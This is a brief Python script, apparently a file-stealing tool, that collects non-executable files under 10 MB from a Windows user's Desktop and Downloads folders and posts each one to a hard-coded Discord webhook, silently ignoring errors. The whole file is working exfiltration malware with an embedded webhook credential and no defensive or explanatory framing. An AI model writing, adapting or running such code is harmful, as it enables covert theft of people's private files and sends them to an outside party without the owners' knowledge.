import os
import requests
webhook_url = 'https://discord.com/api/webhooks/1288538376504348754/cS-bszuAruLnO7SOfMpP07lx6an2Qv5cSCqasRL1mC7pXKFATF4oAi-v_olwOnVS9wo3'
max_file_size = 10 * 1024 * 1024
desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
downloads_path = os.path.join(os.environ['USERPROFILE'], 'Downloads')
def get_files(directory):
    return [os.path.join(directory, f) for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f)) and not f.endswith('.exe') and os.path.getsize(os.path.join(directory, f)) <= max_file_size]
desktop_files = get_files(desktop_path)
downloads_files = get_files(downloads_path)
all_files = desktop_files + downloads_files
txt_files = [f for f in all_files if f.endswith('.txt')]
other_files = [f for f in all_files if not f.endswith('.txt')]
if not txt_files and not other_files:
    pass
else:
    def send_files(files):
        for file_path in files:
            try:
                with open(file_path, 'rb') as file:
                    file_data = file.read()
                    filename = os.path.basename(file_path)
                    response = requests.post(webhook_url, files={'file': (filename, file_data)})
            except Exception:
                pass
    if txt_files:
        send_files(txt_files)
    if other_files:
        send_files(other_files)
